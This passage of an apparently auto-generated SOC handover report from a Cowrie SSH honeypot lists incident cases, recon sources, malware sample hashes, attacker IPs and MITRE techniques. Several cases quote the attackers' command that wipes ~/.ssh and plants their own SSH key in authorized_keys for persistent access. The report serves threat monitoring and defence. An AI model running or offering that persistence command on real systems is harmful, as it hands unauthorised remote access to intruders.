- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c625033cdc3e

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:56 |
| **Last Seen** | 2026-04-14 12:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:56:32` | `cowrie.session.connect` |
| `2026-04-14 12:56:32` | `cowrie.client.version` |
| `2026-04-14 12:56:32` | `cowrie.client.kex` |
| `2026-04-14 12:56:32` | `cowrie.login.success` |
| `2026-04-14 12:56:33` | `cowrie.session.params` |
| `2026-04-14 12:56:33` | `cowrie.command.input` |
| `2026-04-14 12:56:33` | `cowrie.command.failed` |
| `2026-04-14 12:56:33` | `cowrie.log.closed` |
| `2026-04-14 12:56:33` | `cowrie.session.params` |
| `2026-04-14 12:56:33` | `cowrie.command.input` |
| `2026-04-14 12:56:33` | `cowrie.session.file_download` |
| `2026-04-14 12:56:33` | `cowrie.log.closed` |
| `2026-04-14 12:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb9d5ab8e91b

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:56 |
| **Last Seen** | 2026-04-14 12:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:56:35` | `cowrie.session.connect` |
| `2026-04-14 12:56:35` | `cowrie.client.version` |
| `2026-04-14 12:56:35` | `cowrie.client.kex` |
| `2026-04-14 12:56:36` | `cowrie.login.success` |
| `2026-04-14 12:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-778a3b04ca23

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:58 |
| **Last Seen** | 2026-04-14 12:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:58:16` | `cowrie.session.connect` |
| `2026-04-14 12:58:16` | `cowrie.client.version` |
| `2026-04-14 12:58:16` | `cowrie.client.kex` |
| `2026-04-14 12:58:17` | `cowrie.login.success` |
| `2026-04-14 12:58:17` | `cowrie.session.params` |
| `2026-04-14 12:58:17` | `cowrie.command.input` |
| `2026-04-14 12:58:17` | `cowrie.command.failed` |
| `2026-04-14 12:58:17` | `cowrie.log.closed` |
| `2026-04-14 12:58:17` | `cowrie.session.params` |
| `2026-04-14 12:58:17` | `cowrie.command.input` |
| `2026-04-14 12:58:17` | `cowrie.session.file_download` |
| `2026-04-14 12:58:17` | `cowrie.log.closed` |
| `2026-04-14 12:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-640f63d3b4ed

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:58 |
| **Last Seen** | 2026-04-14 12:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:58:19` | `cowrie.session.connect` |
| `2026-04-14 12:58:19` | `cowrie.client.version` |
| `2026-04-14 12:58:20` | `cowrie.client.kex` |
| `2026-04-14 12:58:20` | `cowrie.login.success` |
| `2026-04-14 12:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5927bbcee31d

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 13:00 |
| **Last Seen** | 2026-04-14 13:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 13:00:02` | `cowrie.session.connect` |
| `2026-04-14 13:00:02` | `cowrie.client.version` |
| `2026-04-14 13:00:02` | `cowrie.client.kex` |
| `2026-04-14 13:00:02` | `cowrie.login.success` |
| `2026-04-14 13:00:03` | `cowrie.session.params` |
| `2026-04-14 13:00:03` | `cowrie.command.input` |
| `2026-04-14 13:00:03` | `cowrie.command.failed` |
| `2026-04-14 13:00:03` | `cowrie.log.closed` |
| `2026-04-14 13:00:03` | `cowrie.session.params` |
| `2026-04-14 13:00:03` | `cowrie.command.input` |
| `2026-04-14 13:00:03` | `cowrie.session.file_download` |
| `2026-04-14 13:00:03` | `cowrie.log.closed` |
| `2026-04-14 13:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36f53c98994b

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 13:00 |
| **Last Seen** | 2026-04-14 13:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 13:00:06` | `cowrie.session.connect` |
| `2026-04-14 13:00:06` | `cowrie.client.version` |
| `2026-04-14 13:00:06` | `cowrie.client.kex` |
| `2026-04-14 13:00:06` | `cowrie.login.success` |
| `2026-04-14 13:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `216.48.176[.]84` | **1150** | 2026-04-14 11:33 | 2026-04-14 13:17 | 588m | 0 | `T1592` | 🟠 MEDIUM |
| `13.81.183[.]29` | **25** | 2026-04-14 11:49 | 2026-04-14 12:28 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.85.163[.]94` | **25** | 2026-04-14 11:45 | 2026-04-14 12:30 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.128.149[.]159` | **25** | 2026-04-14 12:17 | 2026-04-14 13:01 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.169.128[.]70` | **25** | 2026-04-14 11:47 | 2026-04-14 12:35 | 1m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `219.150.93[.]157` | **17** | 2026-04-14 11:45 | 2026-04-14 12:01 | 23m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `119.18.55[.]118` | 1 | 2026-04-14 12:14 | 2026-04-14 12:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.104[.]37` | 1 | 2026-04-14 11:48 | 2026-04-14 11:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `153.99.92[.]11` | 1 | 2026-04-14 12:20 | 2026-04-14 12:21 | 53s | 0 | `T1592` | 🟢 LOW |
| `171.25.158[.]82` | 1 | 2026-04-14 12:18 | 2026-04-14 12:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.255.56[.]84` | 1 | 2026-04-14 12:18 | 2026-04-14 12:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `217.154.178[.]95` | 1 | 2026-04-14 11:47 | 2026-04-14 11:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.78.59[.]30` | 1 | 2026-04-14 11:46 | 2026-04-14 11:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.110.147[.]56` | 1 | 2026-04-14 11:46 | 2026-04-14 11:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `3.80.92[.]191` | 1 | 2026-04-14 12:56 | 2026-04-14 12:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.64.74[.]51` | 1 | 2026-04-14 11:49 | 2026-04-14 11:49 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.155.106[.]101` | 1 | 2026-04-14 11:45 | 2026-04-14 11:47 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `216.48.176[.]84` | IN | E2E Networks Limited | **100** ⚠️ | 2 |
| `3.80.92[.]191` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 26 |
| `217.154.178[.]95` | ES | IONOS SE | **100** ⚠️ | 0 |
| `13.81.183[.]29` | NL | Microsoft Corporation | **100** ⚠️ | 50 |
| `222.110.147[.]56` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `153.99.92[.]11` | CN | China Unicom Jiangsu province network | **100** ⚠️ | 50 |
| `219.150.93[.]157` | CN | XINXIBAN-LTD. | **100** ⚠️ | 50 |
| `20.255.56[.]84` | HK | Microsoft Corporation | **100** ⚠️ | 4 |
| `45.169.128[.]70` | BR | THM Tecnologia Net Ltda | **100** ⚠️ | 50 |
| `171.25.158[.]82` | SE | Vaxjo NET C2IP | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 211 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 111 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 83 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 42 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 42 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1363 cases |
| Tool 34  | Credential Extractor        | ✅ 194 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (0.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 83 priority case(s) shown individually · 17 recon entry/entries in table (6 group(s) consolidating 1267 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-14T13:52:20Z_
